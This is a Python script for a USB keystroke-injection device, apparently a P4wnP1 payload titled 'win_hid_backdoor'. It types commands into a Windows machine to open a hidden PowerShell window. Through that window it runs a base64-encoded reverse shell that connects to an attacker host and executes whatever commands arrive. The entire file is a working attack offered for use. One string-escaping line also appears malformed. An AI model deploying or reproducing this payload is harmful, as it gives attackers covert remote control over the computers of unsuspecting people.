#!/usr/bin/env python3
import os, time
from p4wnhid import send_key, send_string, enter, sleep_ms

def main():
    print("[*] Running: win_hid_backdoor (HID-based persistent shell launcher)")

    lhost = os.getenv("P4WN_LHOST", "10.13.37.1")
    lport = int(os.getenv("P4WN_LPORT", "4444"))

    payload = f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}};
$client.Close();
""".strip().replace("\", "\\").replace('"', '`"')

    # Encode as base64 UTF-16LE
    from base64 import b64encode
    b64_payload = b64encode(payload.encode("utf-16le")).decode()

    send_key("GUI", "R")
    sleep_ms(300)
    send_string("powershell")
    enter()
    sleep_ms(800)
    send_string(f"powershell -nop -w hidden -enc {b64_payload}")
    enter()

if __name__ == "__main__":
    main()
